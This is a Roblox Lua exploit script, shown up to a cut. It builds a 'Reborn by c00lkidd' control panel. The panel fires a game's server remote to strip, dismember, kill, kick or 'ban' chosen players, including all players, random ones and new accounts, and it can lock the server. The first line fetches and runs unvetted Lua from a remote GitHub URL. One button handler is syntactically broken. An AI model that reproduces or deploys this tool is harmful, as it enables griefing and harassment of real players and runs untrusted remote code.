loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua"))()
local main = Instance.new("ScreenGui")
local top = Instance.new("Frame")
local back = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local bald = Instance.new("TextButton")
local ragdoll = Instance.new("TextButton")
local kill = Instance.new("TextButton")
local naked = Instance.new("TextButton")
local goto = Instance.new("TextButton")
local rtools = Instance.new("TextButton")
local box = Instance.new("TextButton")
local sink = Instance.new("TextButton")
local ban = Instance.new("TextButton")
local explorer = Instance.new("TextButton")
local slock = Instance.new("TextButton")
local UIGridLayout = Instance.new("UIGridLayout")
local kick = Instance.new("TextButton")
local blockhead = Instance.new("TextButton")
local stools = Instance.new("TextButton")
local noface = Instance.new("TextButton")
local punish = Instance.new("TextButton")
local pantsless = Instance.new("TextButton")
local shirtless = Instance.new("TextButton")
local tshirtless = Instance.new("TextButton")
local noregen = Instance.new("TextButton")
local stopanim = Instance.new("TextButton")
local blockchar = Instance.new("TextButton")
local nolimbs = Instance.new("TextButton")
local nola = Instance.new("TextButton")
local noll = Instance.new("TextButton")
local nora = Instance.new("TextButton")
local norl = Instance.new("TextButton")
local nowaist = Instance.new("TextButton")
local noroot = Instance.new("TextButton")
local top_2 = Instance.new("TextLabel")
local credits = Instance.new("TextLabel")
local queue = Instance.new("TextLabel")
local target = Instance.new("TextBox")
local Players = game:GetService("Players")
function splitString(str,delim)
	local broken = {}
	if delim == nil then delim = "," end
	for w in string.gmatch(str,"[^"..delim.."]+") do
		table.insert(broken,w)
	end
	return broken
end
function toTokens(str)
	local tokens = {}
	for op,name in string.gmatch(str,"([+-])([^+-]+)") do
		table.insert(tokens,{Operator = op,Name = name})
	end
	return tokens
end
function getRoot(char)
	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
	return rootPart
end
local WTS = function(Object)
	local ObjectVector = workspace.CurrentCamera:WorldToScreenPoint(Object.Position)
	return Vector2.new(ObjectVector.X, ObjectVector.Y)
end
local mouse = Players.LocalPlayer:GetMouse()
local MousePositionToVector2 = function()
	return Vector2.new(mouse.X, mouse.Y)
end
local GetClosestPlayerFromCursor = function()
	local found = nil
	local ClosestDistance = math.huge
	for i, v in pairs(Players:GetPlayers()) do
		if v ~= Players.LocalPlayer and v.Character and v.Character:FindFirstChildOfClass("Humanoid") then
			for k, x in pairs(v.Character:GetChildren()) do
				if string.find(x.Name, "Torso") then
					local Distance = (WTS(x) - MousePositionToVector2()).Magnitude
					if Distance < ClosestDistance then
						ClosestDistance = Distance
						found = v
					end
				end
			end
		end
	end
	return found
end
local SpecialPlayerCases = {
	["all"] = function(speaker) return Players:GetPlayers() end,
	["others"] = function(speaker)
		local plrs = {}
		for i,v in pairs(Players:GetPlayers()) do
			if v ~= speaker then
				table.insert(plrs,v)
			end
		end
		return plrs
	end,
	["me"] = function(speaker)return {speaker} end,
	["#(%d+)"] = function(speaker,args,currentList)
		local returns = {}
		local randAmount = tonumber(args[1])
		local players = {unpack(currentList)}
		for i = 1,randAmount do
			if #players == 0 then break end
			local randIndex = math.random(1,#players)
			table.insert(returns,players[randIndex])
			table.remove(players,randIndex)
		end
		return returns
	end,
	["random"] = function(speaker,args,currentList)
		local players = Players:GetPlayers()
		local localplayer = Players.LocalPlayer
		table.remove(players, table.find(players, localplayer))
		return {players[math.random(1,#players)]}
	end,
	["%%(.+)"] = function(speaker,args)
		local returns = {}
		local team = args[1]
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team and string.sub(string.lower(plr.Team.Name),1,#team) == string.lower(team) then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["allies"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team == team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["enemies"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team ~= team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["team"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team == team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["nonteam"] = function(speaker)
		local returns = {}
		local team = speaker.Team
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Team ~= team then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["friends"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["nonfriends"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if not plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["guests"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Guest then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["bacons"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Character:FindFirstChild('Pal Hair') or plr.Character:FindFirstChild('Kate Hair') then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["age(%d+)"] = function(speaker,args)
		local returns = {}
		local age = tonumber(args[1])
		if not age == nil then return end
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.AccountAge <= age then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["nearest"] = function(speaker,args,currentList)
		local speakerChar = speaker.Character
		if not speakerChar or not getRoot(speakerChar) then return end
		local lowest = math.huge
		local NearestPlayer = nil
		for _,plr in pairs(currentList) do
			if plr ~= speaker and plr.Character then
				local distance = plr:DistanceFromCharacter(getRoot(speakerChar).Position)
				if distance < lowest then
					lowest = distance
					NearestPlayer = {plr}
				end
			end
		end
		return NearestPlayer
	end,
	["farthest"] = function(speaker,args,currentList)
		local speakerChar = speaker.Character
		if not speakerChar or not getRoot(speakerChar) then return end
		local highest = 0
		local Farthest = nil
		for _,plr in pairs(currentList) do
			if plr ~= speaker and plr.Character then
				local distance = plr:DistanceFromCharacter(getRoot(speakerChar).Position)
				if distance > highest then
					highest = distance
					Farthest = {plr}
				end
			end
		end
		return Farthest
	end,
	["group(%d+)"] = function(speaker,args)
		local returns = {}
		local groupID = tonumber(args[1])
		for _,plr in pairs(Players:GetPlayers()) do
			if plr:IsInGroup(groupID) then  
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["alive"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["dead"] = function(speaker,args)
		local returns = {}
		for _,plr in pairs(Players:GetPlayers()) do
			if (not plr.Character or not plr.Character:FindFirstChildOfClass("Humanoid")) or plr.Character:FindFirstChildOfClass("Humanoid").Health <= 0 then
				table.insert(returns,plr)
			end
		end
		return returns
	end,
	["rad(%d+)"] = function(speaker,args)
		local returns = {}
		local radius = tonumber(args[1])
		local speakerChar = speaker.Character
		if not speakerChar or not getRoot(speakerChar) then return end
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Character and getRoot(plr.Character) then
				local magnitude = (getRoot(plr.Character).Position-getRoot(speakerChar).Position).magnitude
				if magnitude <= radius then table.insert(returns,plr) end
			end
		end
		return returns
	end,
	["cursor"] = function(speaker)
		local plrs = {}
		local v = GetClosestPlayerFromCursor()
		if v ~= nil then table.insert(plrs, v) end
		return plrs
	end,
}
function onlyIncludeInTable(tab,matches)
	local matchTable = {}
	local resultTable = {}
	for i,v in pairs(matches) do matchTable[v.Name] = true end
	for i,v in pairs(tab) do if matchTable[v.Name] then table.insert(resultTable,v) end end
	return resultTable
end

function removeTableMatches(tab,matches)
	local matchTable = {}
	local resultTable = {}
	for i,v in pairs(matches) do matchTable[v.Name] = true end
	for i,v in pairs(tab) do if not matchTable[v.Name] then table.insert(resultTable,v) end end
	return resultTable
end

function getPlayersByName(Name)
	local Name,Len,Found = string.lower(Name),#Name,{}
	for _,v in pairs(Players:GetPlayers()) do
		if Name:sub(0,1) == '@' then
			if string.sub(string.lower(v.Name),1,Len-1) == Name:sub(2) then
				table.insert(Found,v)
			end
		else
			if string.sub(string.lower(v.Name),1,Len) == Name or string.sub(string.lower(v.DisplayName),1,Len) == Name then
				table.insert(Found,v)
			end
		end
	end
	return Found
end
function getPlayer(list,speaker)
	if list == nil then return {speaker.Name} end
	local nameList = splitString(list,",")

	local foundList = {}

	for _,name in pairs(nameList) do
		if string.sub(name,1,1) ~= "+" and string.sub(name,1,1) ~= "-" then name = "+"..name end
		local tokens = toTokens(name)
		local initialPlayers = Players:GetPlayers()

		for i,v in pairs(tokens) do
			if v.Operator == "+" then
				local tokenContent = v.Name
				local foundCase = false
				for regex,case in pairs(SpecialPlayerCases) do
					local matches = {string.match(tokenContent,"^"..regex.."$")}
					if #matches > 0 then
						foundCase = true
						initialPlayers = onlyIncludeInTable(initialPlayers,case(speaker,matches,initialPlayers))
					end
				end
				if not foundCase then
					initialPlayers = onlyIncludeInTable(initialPlayers,getPlayersByName(tokenContent))
				end
			else
				local tokenContent = v.Name
				local foundCase = false
				for regex,case in pairs(SpecialPlayerCases) do
					local matches = {string.match(tokenContent,"^"..regex.."$")}
					if #matches > 0 then
						foundCase = true
						initialPlayers = removeTableMatches(initialPlayers,case(speaker,matches,initialPlayers))
					end
				end
				if not foundCase then
					initialPlayers = removeTableMatches(initialPlayers,getPlayersByName(tokenContent))
				end
			end
		end

		for i,v in pairs(initialPlayers) do table.insert(foundList,v) end
	end

	local foundNames = {}
	for i,v in pairs(foundList) do table.insert(foundNames,v.Name) end

	return foundNames
end
function Destroy(instance)
	spawn(function()
		game:GetService("ReplicatedStorage").UseItem.Finger:FireServer(instance)
	end)
end

main.Name = "main"
main.Parent = game:GetService("CoreGui")

top.Name = "top"
top.Parent = main
top.Active = true
top.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
top.BackgroundTransparency = 0.300
top.BorderColor3 = Color3.fromRGB(29, 29, 29)
top.Draggable = true
top.Position = UDim2.new(0.612145662, 102, 0.311965823, -29)
top.Size = UDim2.new(0, 291, 0, 30)

back.Name = "back"
back.Parent = top
back.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
back.BackgroundTransparency = 0.300
back.BorderColor3 = Color3.fromRGB(29, 29, 29)
back.BorderSizePixel = 0
back.Position = UDim2.new(-0.00343642617, 0, 1, 0)
back.Size = UDim2.new(0, 293, 0, 293)

ScrollingFrame.Parent = back
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.LayoutOrder = 999999999
ScrollingFrame.Position = UDim2.new(0.0341299027, 0, 0.0784982964, 0)
ScrollingFrame.Size = UDim2.new(0, 282, 0, 208)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 825)

bald.Name = "bald"
bald.Parent = ScrollingFrame
bald.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
bald.BackgroundTransparency = 0.500
bald.BorderSizePixel = 0
bald.Size = UDim2.new(0, 131, 0, 40)
bald.Font = Enum.Font.SourceSansLight
bald.Text = "Bald"
bald.TextColor3 = Color3.fromRGB(255, 255, 255)
bald.TextSize = 23.000
bald.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		for i, v in pairs(Players[v].Character:GetChildren()) do
			if v:IsA("Accessory") then
				Destroy(v)
			end
		end
	end
end)

ragdoll.Name = "ragdoll"
ragdoll.Parent = ScrollingFrame
ragdoll.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
ragdoll.BackgroundTransparency = 0.500
ragdoll.BorderSizePixel = 0
ragdoll.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
ragdoll.Size = UDim2.new(0, 131, 0, 40)
ragdoll.Font = Enum.Font.SourceSansLight
ragdoll.Text = "Ragdoll"
ragdoll.TextColor3 = Color3.fromRGB(255, 255, 255)
ragdoll.TextSize = 23.000
ragdoll.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		Destroy(Players[v].Character:FindFirstChildOfClass("Humanoid"))
	end
end)

kill.Name = "kill"
kill.Parent = ScrollingFrame
kill.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
kill.BackgroundTransparency = 0.500
kill.BorderSizePixel = 0
kill.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
kill.Size = UDim2.new(0, 131, 0, 40)
kill.Font = Enum.Font.SourceSansLight
kill.Text = "Kill"
kill.TextColor3 = Color3.fromRGB(255, 255, 255)
kill.TextSize = 23.000
kill.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		if Players[v].Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
			Destroy(Players[v].Character.Torso.Neck)
		else
			Destroy(Players[v].Character.Head.Neck)
		end
	end
end)

naked.Name = "naked"
naked.Parent = ScrollingFrame
naked.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
naked.BackgroundTransparency = 0.500
naked.BorderSizePixel = 0
naked.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
naked.Size = UDim2.new(0, 131, 0, 40)
naked.Font = Enum.Font.SourceSansLight
naked.Text = "Naked"
naked.TextColor3 = Color3.fromRGB(255, 255, 255)
naked.TextSize = 23.000
naked.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		Destroy(Players[v].Character:FindFirstChildOfClass("Pants"))
		Destroy(Players[v].Character:FindFirstChildOfClass("Shirt"))
		Destroy(Players[v].Character:FindFirstChildOfClass("ShirtGraphic"))
	end
end)

goto.Name = "goto"
goto.Parent = ScrollingFrame
goto.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
goto.BackgroundTransparency = 0.500
goto.BorderSizePixel = 0
goto.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
goto.Size = UDim2.new(0, 131, 0, 40)
goto.Font = Enum.Font.SourceSansLight
goto.Text = "Goto"
goto.TextColor3 = Color3.fromRGB(255, 255, 255)
goto.TextSize = 23.000
goto.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		if Players[v].Character ~= nil then
			if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').SeatPart then
				Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit = false
				wait(.1)
			end
			getRoot(Players.LocalPlayer.Character).CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)
		end
	end
end)

rtools.Name = "rtools"
rtools.Parent = ScrollingFrame
rtools.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
rtools.BackgroundTransparency = 0.500
rtools.BorderSizePixel = 0
rtools.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
rtools.Size = UDim2.new(0, 131, 0, 40)
rtools.Font = Enum.Font.SourceSansLight
rtools.Text = "Rtools"
rtools.TextColor3 = Color3.fromRGB(255, 255, 255)
rtools.TextSize = 23.000
rtools.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text)
	for i, v in pairs(players) do
		for i, v in pairs(Players[v]:FindFirstChildOfClass("Backpack"):GetChildren()) do
			Destroy(v)
		end
	end
end)

box.Name = "box"
box.Parent = ScrollingFrame
box.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
box.BackgroundTransparency = 0.500
box.BorderSizePixel = 0
box.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
box.Size = UDim2.new(0, 131, 0, 40)
box.Font = Enum.Font.SourceSansLight
box.Text = "Box"
box.TextColor3 = Color3.fromRGB(255, 255, 255)
box.TextSize = 23.000
box.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		for i, v in pairs(Players[v].Character:GetChildren()) do
			if v:IsA("Accessory") then
				Destroy(v)
			end
		end
		for i, v in pairs(Players[v].Character:GetChildren()) do
			if v:IsA("CharacterMesh") then
				Destroy(v)
			end
		end
		Destroy(Players[v].Character:FindFirstChildOfClass("Pants"))
		Destroy(Players[v].Character:FindFirstChildOfClass("Shirt"))
		Destroy(Players[v].Character:FindFirstChildOfClass("ShirtGraphic"))
		Destroy(Players[v].Character["Left Arm"])
		Destroy(Players[v].Character["Left Leg"])
		Destroy(Players[v].Character["Right Arm"])
		Destroy(Players[v].Character["Right Leg"])
		Destroy(Players[v].Character.Head:FindFirstChildOfClass("SpecialMesh"))
		Destroy(Players[v].Character.Head:FindFirstChildOfClass("Decal"))
	end
end)

sink.Name = "sink"
sink.Parent = ScrollingFrame
sink.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
sink.BackgroundTransparency = 0.500
sink.BorderSizePixel = 0
sink.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
sink.Size = UDim2.new(0, 131, 0, 40)
sink.Font = Enum.Font.SourceSansLight
sink.Text = "Sink"
sink.TextColor3 = Color3.fromRGB(255, 255, 255)
sink.TextSize = 23.000
sink.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		Destroy(Players[v].Character.HumanoidRootPart)
	end
end)

function FindInTable(tbl,val)
	if tbl == nil then return false end
	for _,v in pairs(tbl) do
		if v == val then return true end
	end 
	return false
end
local slockk = false
local banned = {}
Players.PlayerAdded:connect(function(plr)
	if slockk then
		Destroy(plr)
	end
	if FindInTable(banned, plr.UserId) then
		Destroy(plr)
	end
end)

ban.Name = "ban"
ban.Parent = ScrollingFrame
ban.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
ban.BackgroundTransparency = 0.500
ban.BorderSizePixel = 0
ban.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
ban.Size = UDim2.new(0, 131, 0, 40)
ban.Font = Enum.Font.SourceSansLight
ban.Text = "Ban"
ban.TextColor3 = Color3.fromRGB(255, 255, 255)
ban.TextSize = 23.000
ban.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		table.insert(banned, Players[v].UserId)
		Destroy(Players[v])
	end
end)

explorer.Name = "explorer"
explorer.Parent = ScrollingFrame
explorer.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
explorer.BackgroundTransparency = 0.500
explorer.BorderSizePixel = 0
explorer.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
explorer.Size = UDim2.new(0, 131, 0, 40)
explorer.Font = Enum.Font.SourceSansLight
explorer.Text = "Explorer"
explorer.TextColor3 = Color3.fromRGB(255, 255, 255)
explorer.TextSize = 23.000
explorer.MouseButton1Click:connect(function()
	CreateGui = function()
		loadstring(game:HttpGet(""))()
	end)
end)

slock.Name = "slock"
slock.Parent = ScrollingFrame
slock.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
slock.BackgroundTransparency = 0.500
slock.BorderSizePixel = 0
slock.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
slock.Size = UDim2.new(0, 131, 0, 40)
slock.Font = Enum.Font.SourceSansLight
slock.Text = "Slock"
slock.TextColor3 = Color3.fromRGB(255, 255, 255)
slock.TextSize = 23.000
slock.MouseButton1Click:connect(function()
	if slockk then 
		queue.Text = "Reborn by c00lkidd#1483   SLOCK: false"
		slockk = false
	else
		queue.Text = "Reborn by c00lkidd#1483   SLOCK: true"
		slockk = true
	end
end)

UIGridLayout.Parent = ScrollingFrame
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellPadding = UDim2.new(0, 15, 0, 15)
UIGridLayout.CellSize = UDim2.new(0, 131, 0, 40)

kick.Name = "kick"
kick.Parent = ScrollingFrame
kick.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
kick.BackgroundTransparency = 0.500
kick.BorderSizePixel = 0
kick.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
kick.Size = UDim2.new(0, 131, 0, 40)
kick.Font = Enum.Font.SourceSansLight
kick.Text = "Kick"
kick.TextColor3 = Color3.fromRGB(255, 255, 255)
kick.TextSize = 23.000
kick.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		Destroy(Players[v])
	end
end)

blockhead.Name = "blockhead"
blockhead.Parent = ScrollingFrame
blockhead.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
blockhead.BackgroundTransparency = 0.500
blockhead.BorderSizePixel = 0
blockhead.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
blockhead.Size = UDim2.new(0, 131, 0, 40)
blockhead.Font = Enum.Font.SourceSansLight
blockhead.Text = "Blockhead"
blockhead.TextColor3 = Color3.fromRGB(255, 255, 255)
blockhead.TextSize = 23.000
blockhead.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		Destroy(Players[v].Character.Head:FindFirstChildOfClass("SpecialMesh"))
	end
end)

stools.Name = "stools"
stools.Parent = ScrollingFrame
stools.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
stools.BackgroundTransparency = 0.500
stools.BorderSizePixel = 0
stools.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
stools.Size = UDim2.new(0, 131, 0, 40)
stools.Font = Enum.Font.SourceSansLight
stools.Text = "Stools"
stools.TextColor3 = Color3.fromRGB(255, 255, 255)
stools.TextSize = 23.000
stools.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		Destroy(Players[v].Character:FindFirstChildOfClass("Humanoid"))
		repeat wait() until Players[v].Character:FindFirstChildOfClass("Humanoid").Parent == nil
		for _, v in ipairs(Players[v].Character:GetChildren()) do
			if v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
				Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):EquipTool(v)
			end
		end
	end
end)

noface.Name = "noface"
noface.Parent = ScrollingFrame
noface.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
noface.BackgroundTransparency = 0.500
noface.BorderSizePixel = 0
noface.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
noface.Size = UDim2.new(0, 131, 0, 40)
noface.Font = Enum.Font.SourceSansLight
noface.Text = "Noface"
noface.TextColor3 = Color3.fromRGB(255, 255, 255)
noface.TextSize = 23.000
noface.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		Destroy(Players[v].Character.Head:FindFirstChildOfClass("Decal"))
	end
end)

punish.Name = "punish"
punish.Parent = ScrollingFrame
punish.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
punish.BackgroundTransparency = 0.500
punish.BorderSizePixel = 0
punish.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
punish.Size = UDim2.new(0, 131, 0, 40)
punish.Font = Enum.Font.SourceSansLight
punish.Text = "Punish"
punish.TextColor3 = Color3.fromRGB(255, 255, 255)
punish.TextSize = 23.000
punish.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		Destroy(Players[v].Character)
	end
end)

pantsless.Name = "pantsless"
pantsless.Parent = ScrollingFrame
pantsless.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
pantsless.BackgroundTransparency = 0.500
pantsless.BorderSizePixel = 0
pantsless.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
pantsless.Size = UDim2.new(0, 131, 0, 40)
pantsless.Font = Enum.Font.SourceSansLight
pantsless.Text = "Pantsless"
pantsless.TextColor3 = Color3.fromRGB(255, 255, 255)
pantsless.TextSize = 23.000
pantsless.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		Destroy(Players[v].Character:FindFirstChildOfClass("Pants"))
	end
end)

shirtless.Name = "shirtless"
shirtless.Parent = ScrollingFrame
shirtless.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
shirtless.BackgroundTransparency = 0.500
shirtless.BorderSizePixel = 0
shirtless.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
shirtless.Size = UDim2.new(0, 131, 0, 40)
shirtless.Font = Enum.Font.SourceSansLight
shirtless.Text = "Shirtless"
shirtless.TextColor3 = Color3.fromRGB(255, 255, 255)
shirtless.TextSize = 23.000
shirtless.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		Destroy(Players[v].Character:FindFirstChildOfClass("Shirt"))
	end
end)

tshirtless.Name = "tshirtless"
tshirtless.Parent = ScrollingFrame
tshirtless.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
tshirtless.BackgroundTransparency = 0.500
tshirtless.BorderSizePixel = 0
tshirtless.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
tshirtless.Size = UDim2.new(0, 131, 0, 40)
tshirtless.Font = Enum.Font.SourceSansLight
tshirtless.Text = "Tshirtless"
tshirtless.TextColor3 = Color3.fromRGB(255, 255, 255)
tshirtless.TextSize = 23.000
tshirtless.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		Destroy(Players[v].Character:FindFirstChildOfClass("ShirtGraphic"))
	end
end)

noregen.Name = "noregen"
noregen.Parent = ScrollingFrame
noregen.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
noregen.BackgroundTransparency = 0.500
noregen.BorderSizePixel = 0
noregen.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
noregen.Size = UDim2.new(0, 131, 0, 40)
noregen.Font = Enum.Font.SourceSansLight
noregen.Text = "Noregen"
noregen.TextColor3 = Color3.fromRGB(255, 255, 255)
noregen.TextSize = 23.000
noregen.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		Destroy(Players[v].Character:FindFirstChild("Health"))
	end
end)

stopanim.Name = "stopanim"
stopanim.Parent = ScrollingFrame
stopanim.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
stopanim.BackgroundTransparency = 0.500
stopanim.BorderSizePixel = 0
stopanim.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
stopanim.Size = UDim2.new(0, 131, 0, 40)
stopanim.Font = Enum.Font.SourceSansLight
stopanim.Text = "Stopanim"
stopanim.TextColor3 = Color3.fromRGB(255, 255, 255)
stopanim.TextSize = 23.000
stopanim.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		Destroy(Players[v].Character:FindFirstChildOfClass("Humanoid"):FindFirstChildOfClass("Animator"))
	end
end)

blockchar.Name = "blockchar"
blockchar.Parent = ScrollingFrame
blockchar.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
blockchar.BackgroundTransparency = 0.500
blockchar.BorderSizePixel = 0
blockchar.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
blockchar.Size = UDim2.new(0, 131, 0, 40)
blockchar.Font = Enum.Font.SourceSansLight
blockchar.Text = "Blockchar"
blockchar.TextColor3 = Color3.fromRGB(255, 255, 255)
blockchar.TextSize = 23.000
blockchar.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		for i, v in pairs(Players[v].Character:GetChildren()) do
			if v:IsA("CharacterMesh") then
				Destroy(v)
			end
		end
	end
end)

nolimbs.Name = "nolimbs"
nolimbs.Parent = ScrollingFrame
nolimbs.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
nolimbs.BackgroundTransparency = 0.500
nolimbs.BorderSizePixel = 0
nolimbs.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
nolimbs.Size = UDim2.new(0, 131, 0, 40)
nolimbs.Font = Enum.Font.SourceSansLight
nolimbs.Text = "Nolimbs"
nolimbs.TextColor3 = Color3.fromRGB(255, 255, 255)
nolimbs.TextSize = 23.000
nolimbs.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		if Players[v].Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
			Destroy(Players[v].Character["Left Arm"])
			Destroy(Players[v].Character["Left Leg"])
			Destroy(Players[v].Character["Right Arm"])
			Destroy(Players[v].Character["Right Leg"])
		else
			Destroy(Players[v].Character["LeftUpperArm"])
			Destroy(Players[v].Character["LeftUpperLeg"])
			Destroy(Players[v].Character["RightUpperArm"])
			Destroy(Players[v].Character["RightUpperLeg"])
		end
	end
end)

nola.Name = "nola"
nola.Parent = ScrollingFrame
nola.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
nola.BackgroundTransparency = 0.500
nola.BorderSizePixel = 0
nola.Position = UDim2.new(0.079136692, 0, -0.00990098994, 0)
nola.Size = UDim2.new(0, 131, 0, 40)
nola.Font = Enum.Font.SourceSansLight
nola.Text = "Nola"
nola.TextColor3 = Color3.fromRGB(255, 255, 255)
nola.TextSize = 23.000
nola.MouseButton1Click:connect(function()
	local players = getPlayer(target.Text, Players.LocalPlayer)
	for i, v in pairs(players) do
		if Players[v].Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
